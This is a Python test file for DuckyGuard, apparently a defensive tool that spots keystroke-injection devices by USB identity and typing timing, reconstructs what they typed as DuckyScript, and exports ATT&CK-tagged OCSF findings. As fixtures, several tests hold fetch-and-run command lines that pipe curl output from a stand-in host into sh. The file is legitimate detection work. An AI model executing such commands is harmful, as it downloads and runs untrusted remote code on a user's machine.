"""Built-in data and exports: injector identities, USB vendor names, ATT&CK mapping,
opener signatures, script reconstruction, JSON and OCSF output, and the test-payload pack."""

import glob
import json
import os
import time

import pytest

from duckyguard.cli import main
from duckyguard.detector import KeyEvent, KeystrokeAnomalyDetector
from duckyguard.devices import Keyboard, identify_injector, identity_flags, vendor_name
from duckyguard.incidents import analyze_text, build_incident, reconstruct_script, render_markdown, to_ocsf
from duckyguard.store import Store


def kb(vid, pid, product="", manufacturer="", serial="", transport="USB", built_in=False):
    return Keyboard(key=f"{vid:04x}:{pid:04x}:{transport}:{product or 'Unnamed keyboard'}", product=product,
                    manufacturer=manufacturer, vendor_id=vid, product_id=pid, serial=serial, transport=transport,
                    built_in=built_in, location_id=1, first_seen=time.time())


# ------------------------------------------------------------------ injector identities

def test_flipper_factory_identity_is_recognised():
    hit = identify_injector(kb(0x046D, 0xC529))                       # Logitech ids, no name strings
    assert hit and "Flipper Zero" in hit["label"] and hit["confidence"] == "likely"


def test_a_real_logitech_device_with_the_same_ids_is_not_flagged():
    assert identify_injector(kb(0x046D, 0xC529, "USB Receiver", "Logitech")) is None


@pytest.mark.parametrize("device, word", [
    (kb(0x1D6B, 0x1347, "P4wnP1 by MaMe82", "MaMe82", "deadbeef1337"), "P4wnP1"),
    (kb(0xF000, 0xFF01, "Bash Bunny"), "Bash Bunny"),
    (kb(0x16C0, 0x27DB, "DigiKey", "digistump.com"), "Digispark"),
    (kb(0x0000, 0x0000, "BadKB Flippy", transport="Bluetooth"), "Flipper"),
    (kb(0x05AC, 0x021E, "USB Input Device", serial="111111111111"), "Rubber Ducky"),
    (kb(0x1234, 0xABCD, "Flipper Zero", "Flipper Devices"), "Flipper"),
])
def test_definite_injector_identities(device, word):
    hit = identify_injector(device)
    assert hit and word in hit["label"] and hit["confidence"] == "definite" and hit["source"].startswith("http")


@pytest.mark.parametrize("device", [kb(0x239A, 0x80F4, "Pico", "Raspberry Pi"), kb(0x2E8A, 0x000A, "Pico"),
                                    kb(0x2341, 0x8036, "Arduino Leonardo"), kb(0x16C0, 0x0482, "Keyboard/Mouse/Joystick")])
def test_hobby_boards_get_a_soft_note(device):
    assert identify_injector(device)["confidence"] == "hobby board"


def test_ordinary_keyboards_are_not_identified_as_injectors():
    assert identify_injector(kb(0x05AC, 0x024F, "Keychron K2", "Keychron")) is None
    assert identify_injector(kb(0, 0, "Apple Internal Keyboard / Trackpad", "Apple", transport="FIFO", built_in=True)) is None


def test_usb_vendor_names_are_built_in():
    assert "Logitech" in vendor_name(0x046D)
    assert "Apple" in vendor_name(0x05AC)
    assert "Raspberry Pi" in vendor_name(0x2E8A)             # missing upstream, added by hand
    assert vendor_name(0xFFF1) == ""


def test_big_brand_vendor_id_with_someone_elses_name_is_flagged():
    fake = kb(0x046D, 0xC529, "Flipper Zero", "Flipper Devices Inc.")
    flags = identity_flags(fake, [], {})
    assert "vendor mismatch" in flags and "known injector identity" in flags
    assert identity_flags(kb(0x046D, 0xC31C, "USB Keyboard", "Logitech"), [], {}) == []


# ------------------------------------------------------------- ATT&CK, openers, scripts

def test_attack_mapping_leads_with_input_injection():
    ids = [t["id"] for t in analyze_text("hello")["mitre"]]
    assert ids[0] == "T1674" and "T1200" in ids


def test_spotlight_to_terminal_opener_is_recognised():
    det, t, v = KeystrokeAnomalyDetector(), 0.0, None
    for i, ch in enumerate("terminal\n"):
        t += 0.13 + 0.05 * (i % 3)
        v = det.observe(KeyEvent(timestamp=t, char=ch, hold_time=0.09))
    assert v.features["pattern"] == "Spotlight to Terminal opener"


def test_script_reconstruction_reads_like_a_payload():
    assert reconstruct_script("terminal\ncurl -s http://x.test | sh\n") == [
        "STRING terminal", "ENTER", "STRING curl -s http://x.test | sh", "ENTER"]
    assert reconstruct_script("ab[BKSP]c\t[esc]") == ["STRING ab", "BACKSPACE", "STRING c", "TAB", "ESC"]
    assert reconstruct_script("") == []


def sample_incident():
    verdict = {"block": True, "score": 0.9, "reasons": ["6 keys in a row were released within 1 ms"], "kind": "machine",
               "features": {"burst_len": 7, "rule": "K: 6 keys in a row released instantly"}, "explanation": "Blocked."}
    inc = build_incident(verdict, kb(0x046D, 0xC529).as_dict(), "termin", started_at=1794400000.0)
    inc.update({"blocked_text": "al\ncurl http://x.test/a | sh\n", "blocked_count": 30, "ended_at": 1794400002.5,
                "summary": "A keyboard typed 37 keys; 30 were blocked."})
    return inc


def test_report_includes_the_reconstructed_script():
    md = render_markdown(sample_incident(), "2.1.0")
    assert "DuckyScript-style" in md and "STRING terminal" in md and "T1674" in md


def test_ocsf_detection_finding_has_the_required_shape():
    f = to_ocsf(sample_incident(), "2.1.0")
    assert f["class_uid"] == 2004 and f["category_uid"] == 2 and f["type_uid"] == 200401
    assert f["time"] == 1794400000000 and f["severity_id"] in (3, 4, 5)
    assert f["metadata"]["product"]["name"] == "DuckyGuard" and f["metadata"]["product"]["version"] == "2.1.0"
    assert f["finding_info"]["uid"] and f["finding_info"]["title"]
    assert any(a["technique"]["uid"] == "T1674" for a in f["finding_info"]["attacks"])
    json.dumps(f)


def test_cli_lists_incidents_as_json_and_exports_ocsf(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("DUCKYGUARD_HOME", str(tmp_path))
    inc = sample_incident()
    Store().save_incident(inc)
    assert main(["incidents", "--json"]) == 0
    rows = [json.loads(line) for line in capsys.readouterr().out.strip().splitlines()]
    assert rows[0]["id"] == inc["id"] and rows[0]["rule"].startswith("K")
    assert main(["export", inc["id"], "--format", "ocsf"]) == 0
    path = capsys.readouterr().out.strip()
    assert path.endswith(".json") and json.load(open(path))["class_uid"] == 2004


# --------------------------------------------------------------------- test payloads

HARMLESS = {"REM", "DELAY", "DEFAULT_DELAY", "DEFAULTDELAY", "STRING_DELAY", "STRINGDELAY", "STRING", "ID"}


def test_shipped_test_payloads_only_type_text():
    files = glob.glob(os.path.join(os.path.dirname(__file__), "..", "test-payloads", "*.txt"))
    assert len(files) >= 4
    for path in files:
        for line in open(path, encoding="utf-8").read().splitlines():
            if line.strip():
                assert line.split()[0] in HARMLESS, f"{os.path.basename(path)}: {line}"
